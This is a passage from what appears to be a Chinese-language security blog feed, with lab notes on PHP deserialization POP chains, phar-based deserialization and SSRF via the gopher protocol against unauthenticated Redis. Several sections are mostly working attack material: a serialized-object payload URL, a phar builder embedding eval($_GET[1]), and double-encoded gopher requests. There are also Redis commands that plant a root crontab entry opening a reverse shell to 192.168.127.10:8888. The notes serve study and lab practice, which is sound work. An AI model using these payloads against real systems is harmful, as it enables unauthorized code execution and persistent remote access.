class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br>@<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">1</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>];<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">baby</span> </span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)      </span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;file))<br>        &#123;<br>            <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;./<span class="hljs-subst">&#123;$this-&gt;file&#125;</span>&quot;</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$filename</span>))<br>            &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$filename</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$data</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[oc]:\d+:/i&#x27;</span>,<span class="hljs-variable">$data</span>,<span class="hljs-variable">$matches</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$matches</span>))<br>    &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Hacker!&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-variable">$good</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$data</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$good</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span> <br>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&quot;./test4.php&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>+绕过正则匹配,而且浏览器要进行编码%<span class="hljs-number">2</span>b<br></code></pre></td></tr></table></figure><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs perl">字符串拼接和echo一样都能触发__tostring<br>&lt;?php<br>class A<br>&#123;<br>    public $mod1;<br>    public $mod2;<br>    public function __destruct()<br>    &#123;<br>        $this-&gt;mod1-&gt;test1();<br>    &#125;<br>&#125;<br>//$a=new A();<br><span class="hljs-regexp">//</span>$a-&gt;mod1=new B();<br><span class="hljs-regexp">//</span>$b=$a-&gt;mod1;<br><span class="hljs-regexp">//</span>var_dump(serialize($a));<br>class B<br>&#123;<br>    public $mod1;<br>    public $mod2;<br>    public function test1()<br>    &#123;<br>        $this-&gt;mod1-&gt;test2();<br>    &#125;<br>&#125;<br>//$b-&gt;mod1=new C();<br><span class="hljs-regexp">//</span>$c=$b-&gt;mod1;<br><span class="hljs-regexp">//</span>var_dump(serialize($a));<br><br>class C<br>&#123;<br>    public $mod1;<br>    public $mod2;<br>    public function __call($test2,$arr)<br>    &#123;<br>        $s1 = $this-&gt;mod1;<br>        $s1();<br>    &#125;<br>&#125;<br>//$d=$c-&gt;mod1=new D();<br><span class="hljs-regexp">//</span>var_dump(serialize($a));<br>class D<br>&#123;<br>    public $mod1;<br>    public $mod2;<br>    public function __invoke()<br>    &#123;<br>        $this-&gt;mod2 = <span class="hljs-string">&quot;字符串拼接&quot;</span>.$this-&gt;mod1;<br>    &#125;<br>&#125;<br>//$e=$d-&gt;mod1=new E();<br><span class="hljs-regexp">//</span>var_dump(serialize($a));<br>class E<br>&#123;<br>    public $str1;<br>    public $str2;<br>    public function __toString()<br>    &#123;<br>        $this-&gt;str1-&gt;get_flag();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;1&quot;</span>;<br>    &#125;<br>&#125;<br>//$f=$e-&gt;str1=new GetFlag();<br><span class="hljs-regexp">//</span>var_dump(serialize($f));<br><span class="hljs-regexp">//</span>var_dump(serialize($a));<br>class GetFlag //O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;GetFlag&quot;</span>:<span class="hljs-number">0</span>:&#123;&#125;<br>&#123;<br>    public function get_flag()<br>    &#123;<br>        echo <span class="hljs-string">&quot;flag:&quot;</span>.<span class="hljs-string">&quot;xxxxxxxxxxxx&quot;</span>;<br>    &#125;<br>&#125;<br><br>$a = $_GET[<span class="hljs-string">&#x27;string&#x27;</span>];<br>unserialize($a);<br>?&gt;<br>payload:<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>/<span class="hljs-number">12</span>.php?string=O:<span class="hljs-number">1</span>:%22A%22:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:%22mod1%22;O:<span class="hljs-number">1</span>:%22B%22:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:%22mod1%22;O:<span class="hljs-number">1</span>:%22C%22:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:%22mod1%22;O:<span class="hljs-number">1</span>:%22D%22:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:%22mod1%22;O:<span class="hljs-number">1</span>:%22E%22:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:%22str1%22;O:<span class="hljs-number">7</span>:%22GetFlag%22:<span class="hljs-number">0</span>:&#123;&#125;s:<span class="hljs-number">4</span>:%22str2%22;N;&#125;s:<span class="hljs-number">4</span>:%22mod2%22;N;&#125;s:<span class="hljs-number">4</span>:%22mod2%22;N;&#125;s:<span class="hljs-number">4</span>:%22mod2%22;N;&#125;s:<span class="hljs-number">4</span>:%22mod2%22;N;&#125;<br>对于反序列化来说就是一个类的属性是另一个类的对象<br></code></pre></td></tr></table></figure><p>即使没有反序列化函数,但是利用phar协议加上文件操作函数加载phar包,可以自动调用反序列化函数,并执行phar包里面的序列化字符串</p><p><img src="/2021/07/29/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221017160142551.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Files</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;eval($_GET[1]);&#x27;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;b);<br>    &#125;<br><br>&#125;<br><br>@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>); <span class="hljs-comment">//后缀名必须为phar,前缀随便改</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//设置stub</span><br><span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Files</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>); <span class="hljs-comment">//将自定义的meta-data存入manifest</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//添加要压缩的文件</span><br><span class="hljs-comment">//签名自动计算</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br>本地生成文件,phpstudy需要改php.ini的xxx-<span class="hljs-keyword">readonly</span>为off<br>生成phar.phar/test.txt<br></code></pre></td></tr></table></figure><p><img src="/2021/07/29/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221017161743371.png"></p><p><img src="/2021/07/29/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221017162729465.png"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs awk">class Files&#123;<br>    var <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">function</span> __destruct()&#123;<br>        eval(<span class="hljs-variable">$this</span>-&gt;b);<br>    &#125;<br><br>&#125;<br><br><span class="hljs-regexp">//</span><span class="hljs-variable">$a</span>=new Files();<br><span class="hljs-regexp">//</span>var_dump(serialize(<span class="hljs-variable">$a</span>));<br><span class="hljs-regexp">//</span><span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;../&#x27;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>file_exists(<span class="hljs-string">&#x27;phar://phar.phar/test.txt&#x27;</span>);<br>?&gt;<br></code></pre></td></tr></table></figure><p><img src="/2021/07/29/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%5Cimage-20221017171008570.png"></p><p><img src="/2021/07/29/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221017171052237.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Destruct called&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$filename</span>);<br><br></code></pre></td></tr></table></figure><p><img src="/2021/07/29/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221017171445092.png"></p><p><img src="/2021/07/29/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221017171454471.png"></p><p><img src="/2021/07/29/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221017171929078.png"></p>]]></content>
    
    
    <categories>
      
      <category>外网知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php反序列化1</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ssrf配合redis未授授权</title>
    <link href="/2021/07/26/ssrf%E9%85%8D%E5%90%88redis%E6%9C%AA%E6%8E%88%E6%8E%88%E6%9D%83/"/>
    <url>/2021/07/26/ssrf%E9%85%8D%E5%90%88redis%E6%9C%AA%E6%8E%88%E6%8E%88%E6%9D%83/</url>
    
    <content type="html"><![CDATA[<p><img src="/2021/07/26/ssrf%E9%85%8D%E5%90%88redis%E6%9C%AA%E6%8E%88%E6%8E%88%E6%9D%83/image-20221026213303128.png"></p><p>curl –version 查看本服务器的curl支持什么协议</p><p><img src="/2021/07/26/ssrf%E9%85%8D%E5%90%88redis%E6%9C%AA%E6%8E%88%E6%8E%88%E6%9D%83/image-20221026213345663.png"></p><p><img src="/2021/07/26/ssrf%E9%85%8D%E5%90%88redis%E6%9C%AA%E6%8E%88%E6%8E%88%E6%9D%83/boke\95\source_posts\ssrf配合redis未授授权\image-20221026215834394.png" alt="image-20221026215834394"></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs llvm">对于gopher协议发送get请求的前提<br>换行必须要加上<span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<br>结尾必须要加上<span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<br><br>示例 :<br>GET /test.php?url<span class="hljs-operator">=</span>tom  HTTP/<span class="hljs-number">1.1</span><br>HOST:<span class="hljs-number">192.168</span>.<span class="hljs-number">111.113</span><br><br>编码后 :<br>GET <span class="hljs-variable">%20</span>/test.php<span class="hljs-variable">%3</span>furl<span class="hljs-operator">=</span>tom<span class="hljs-number">20</span><span class="hljs-variable">%HTTP</span>/<span class="hljs-number">1.1</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<br>HOST:<span class="hljs-variable">%20192</span>.<span class="hljs-number">168.111</span>.<span class="hljs-number">113</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<br><br><br>需要利用 curl里面gopher协议发送GET请求       : curl  gopher://<span class="hljs-number">192.168</span>.<span class="hljs-number">111.133</span>:<span class="hljs-number">80</span>/_GET<span class="hljs-variable">%20</span>/test.php<span class="hljs-variable">%3</span>furl<span class="hljs-operator">=</span>tom<span class="hljs-variable">%20</span>HTTP/<span class="hljs-number">1.1</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>aHOST:<span class="hljs-variable">%20192</span>.<span class="hljs-number">168.111</span>.<span class="hljs-number">133</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<br></code></pre></td></tr></table></figure><p><img src="/2021/07/26/ssrf%E9%85%8D%E5%90%88redis%E6%9C%AA%E6%8E%88%E6%8E%88%E6%9D%83/image-20221026213428825.png"></p><p>gopher协议发送post请求包</p><p><img src="/2021/07/26/ssrf%E9%85%8D%E5%90%88redis%E6%9C%AA%E6%8E%88%E6%8E%88%E6%9D%83/image-20221026213512241.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">curl</span> gopher://<span class="hljs-number">192.168.159.130:80</span>/_POST%<span class="hljs-number">20</span>/test.php%<span class="hljs-number">20</span>HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aHost:%<span class="hljs-number">20192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">159</span>.<span class="hljs-number">130</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aContent-Type:%<span class="hljs-number">20</span>application/x-www-form-urlencoded%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aContent-Length:%<span class="hljs-number">208</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aurl=toms%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a<br></code></pre></td></tr></table></figure><p>对于centos7利用gopher协议探测攻击内网kali的redis数据库:</p><p><img src="/2021/07/26/ssrf%E9%85%8D%E5%90%88redis%E6%9C%AA%E6%8E%88%E6%8E%88%E6%9D%83/image-20221026213553152.png"></p><p><img src="/2021/07/26/ssrf%E9%85%8D%E5%90%88redis%E6%9C%AA%E6%8E%88%E6%8E%88%E6%9D%83/image-20221026213618746.png"></p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs xquery">*<span class="hljs-number">2</span><br><span class="hljs-variable">$3</span><br>get<br><span class="hljs-variable">$2</span><br>hs<br>quit //成功的前提之一<br><br><br><br>curl http://<span class="hljs-number">192.168</span>.<span class="hljs-number">127.11</span>/ssrf.php?url=gopher<span class="hljs-meta">%3a</span><span class="hljs-meta">%2f</span><span class="hljs-meta">%2f127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span><span class="hljs-meta">%3a6379</span><span class="hljs-meta">%2f_</span><span class="hljs-meta">%25</span><span class="hljs-meta">%32</span><span class="hljs-meta">%61</span><span class="hljs-meta">%25</span><span class="hljs-meta">%33</span><span class="hljs-meta">%32</span><span class="hljs-meta">%25</span><span class="hljs-meta">%30</span><span class="hljs-meta">%64</span><span class="hljs-meta">%25</span><span class="hljs-meta">%30</span><span class="hljs-meta">%61</span><span class="hljs-meta">%25</span><span class="hljs-meta">%32</span><span class="hljs-meta">%34</span><span class="hljs-meta">%25</span><span class="hljs-meta">%33</span><span class="hljs-meta">%33</span><span class="hljs-meta">%25</span><span class="hljs-meta">%30</span><span class="hljs-meta">%64</span><span class="hljs-meta">%25</span><span class="hljs-meta">%30</span><span class="hljs-meta">%61</span><span class="hljs-meta">%25</span><span class="hljs-meta">%36</span><span class="hljs-meta">%37</span><span class="hljs-meta">%25</span><span class="hljs-meta">%36</span><span class="hljs-meta">%35</span><span class="hljs-meta">%25</span><span class="hljs-meta">%37</span><span class="hljs-meta">%34</span><span class="hljs-meta">%25</span><span class="hljs-meta">%30</span><span class="hljs-meta">%64</span><span class="hljs-meta">%25</span><span class="hljs-meta">%30</span><span class="hljs-meta">%61</span><span class="hljs-meta">%25</span><span class="hljs-meta">%32</span><span class="hljs-meta">%34</span><span class="hljs-meta">%25</span><span class="hljs-meta">%33</span><span class="hljs-meta">%32</span><span class="hljs-meta">%25</span><span class="hljs-meta">%30</span><span class="hljs-meta">%64</span><span class="hljs-meta">%25</span><span class="hljs-meta">%30</span><span class="hljs-meta">%61</span><span class="hljs-meta">%25</span><span class="hljs-meta">%36</span><span class="hljs-meta">%38</span><span class="hljs-meta">%25</span><span class="hljs-meta">%37</span><span class="hljs-meta">%33</span><span class="hljs-meta">%25</span><span class="hljs-meta">%30</span><span class="hljs-meta">%64</span><span class="hljs-meta">%25</span><span class="hljs-meta">%30</span><span class="hljs-meta">%61</span><span class="hljs-meta">%25</span><span class="hljs-meta">%37</span><span class="hljs-meta">%31</span><span class="hljs-meta">%25</span><span class="hljs-meta">%37</span><span class="hljs-meta">%35</span><span class="hljs-meta">%25</span><span class="hljs-meta">%36</span><span class="hljs-meta">%39</span><span class="hljs-meta">%25</span><span class="hljs-meta">%37</span><span class="hljs-meta">%34</span><span class="hljs-meta">%25</span><span class="hljs-meta">%30</span><span class="hljs-meta">%64</span><span class="hljs-meta">%25</span><span class="hljs-meta">%30</span><span class="hljs-meta">%61</span><br><br><br>第一次编码 : <span class="hljs-meta">%2a</span><span class="hljs-meta">%32</span><span class="hljs-meta">%0d</span><span class="hljs-meta">%0a</span><span class="hljs-meta">%24</span><span class="hljs-meta">%33</span><span class="hljs-meta">%0d</span><span class="hljs-meta">%0a</span><span class="hljs-meta">%67</span><span class="hljs-meta">%65</span><span class="hljs-meta">%74</span><span class="hljs-meta">%0d</span><span class="hljs-meta">%0a</span><span class="hljs-meta">%24</span><span class="hljs-meta">%32</span><span class="hljs-meta">%0d</span><span class="hljs-meta">%0a</span><span class="hljs-meta">%68</span><span class="hljs-meta">%73</span><span class="hljs-meta">%0d</span><span class="hljs-meta">%0a</span><span class="hljs-meta">%71</span><span class="hljs-meta">%75</span><span class="hljs-meta">%69</span><span class="hljs-meta">%74</span><span class="hljs-meta">%0d</span><span class="hljs-meta">%0a</span><br><br><br><br>第二次编码 : <span class="hljs-meta">%25</span><span class="hljs-meta">%32</span><span class="hljs-meta">%61</span><span class="hljs-meta">%25</span><span class="hljs-meta">%33</span><span class="hljs-meta">%32</span><span class="hljs-meta">%25</span><span class="hljs-meta">%30</span><span class="hljs-meta">%64</span><span class="hljs-meta">%25</span><span class="hljs-meta">%30</span><span class="hljs-meta">%61</span><span class="hljs-meta">%25</span><span class="hljs-meta">%32</span><span class="hljs-meta">%34</span><span class="hljs-meta">%25</span><span class="hljs-meta">%33</span><span class="hljs-meta">%33</span><span class="hljs-meta">%25</span><span class="hljs-meta">%30</span><span class="hljs-meta">%64</span><span class="hljs-meta">%25</span><span class="hljs-meta">%30</span><span class="hljs-meta">%61</span><span class="hljs-meta">%25</span><span class="hljs-meta">%36</span><span class="hljs-meta">%37</span><span class="hljs-meta">%25</span><span class="hljs-meta">%36</span><span class="hljs-meta">%35</span><span class="hljs-meta">%25</span><span class="hljs-meta">%37</span><span class="hljs-meta">%34</span><span class="hljs-meta">%25</span><span class="hljs-meta">%30</span><span class="hljs-meta">%64</span><span class="hljs-meta">%25</span><span class="hljs-meta">%30</span><span class="hljs-meta">%61</span><span class="hljs-meta">%25</span><span class="hljs-meta">%32</span><span class="hljs-meta">%34</span><span class="hljs-meta">%25</span><span class="hljs-meta">%33</span><span class="hljs-meta">%32</span><span class="hljs-meta">%25</span><span class="hljs-meta">%30</span><span class="hljs-meta">%64</span><span class="hljs-meta">%25</span><span class="hljs-meta">%30</span><span class="hljs-meta">%61</span><span class="hljs-meta">%25</span><span class="hljs-meta">%36</span><span class="hljs-meta">%38</span><span class="hljs-meta">%25</span><span class="hljs-meta">%37</span><span class="hljs-meta">%33</span><span class="hljs-meta">%25</span><span class="hljs-meta">%30</span><span class="hljs-meta">%64</span><span class="hljs-meta">%25</span><span class="hljs-meta">%30</span><span class="hljs-meta">%61</span><span class="hljs-meta">%25</span><span class="hljs-meta">%37</span><span class="hljs-meta">%31</span><span class="hljs-meta">%25</span><span class="hljs-meta">%37</span><span class="hljs-meta">%35</span><span class="hljs-meta">%25</span><span class="hljs-meta">%36</span><span class="hljs-meta">%39</span><span class="hljs-meta">%25</span><span class="hljs-meta">%37</span><span class="hljs-meta">%34</span><span class="hljs-meta">%25</span><span class="hljs-meta">%30</span><span class="hljs-meta">%64</span><span class="hljs-meta">%25</span><span class="hljs-meta">%30</span><span class="hljs-meta">%61</span><br></code></pre></td></tr></table></figure><p><img src="/2021/07/26/ssrf%E9%85%8D%E5%90%88redis%E6%9C%AA%E6%8E%88%E6%8E%88%E6%9D%83/image-20221026213641185.png"></p><p><strong>一般redis处于内网,它不会设置安全密码,可以通过web服务器对redis进行ssrf进行攻击</strong></p><p>我们对redis数据库写key的值的时候并没有限制写入的内容,于是我们可以写木马,但是我们木马放在哪里?redis数据备份与恢复起到了一定的作用.</p><p>只要是curl或者浏览器访问都需要二次编码,因为gopher的原因</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">set</span> 变量名 <span class="hljs-string">&quot;备份内容&quot;</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">config </span><span class="hljs-built_in">set</span> 变量名 <span class="hljs-string">&quot;文件路径&quot;</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">config </span><span class="hljs-built_in">set</span> 变量名 <span class="hljs-string">&quot;文件名字&quot;</span><br>save   写木马 反弹shell<br></code></pre></td></tr></table></figure><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">set</span> tom <span class="hljs-string">&quot;<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span><span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.127.10/8888        </span><br><span class="hljs-string">0&gt;&amp;1<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span><span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>&quot;</span><br><span class="hljs-comment">//为什么要进行\n换行,怕之前就有文件内容存在怕乱码</span><br>config <span class="hljs-keyword">set</span> dir <span class="hljs-operator">/</span>etc<span class="hljs-operator">/</span><br>config <span class="hljs-keyword">set</span> dbfilename crontab<br>save<br></code></pre></td></tr></table></figure><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-strong">**只要是限制本地访问的redis需要用127.0.0.1来访问**</span><br></code></pre></td></tr></table></figure><p><img src="/2021/07/26/ssrf%E9%85%8D%E5%90%88redis%E6%9C%AA%E6%8E%88%E6%8E%88%E6%9D%83/image-20221026213755943.png"></p><p>儅ssrf用不了可以考慮用dict協議（不過1遇到設置密碼的服務就不得行了）</p>]]></content>
    
    
    <categories>
      
      <category>外网知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ssrf配合redis未授授权</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ssrf</title>
    <link href="/2021/07/25/ssrf/"/>
    <url>/2021/07/25/ssrf/</url>
    
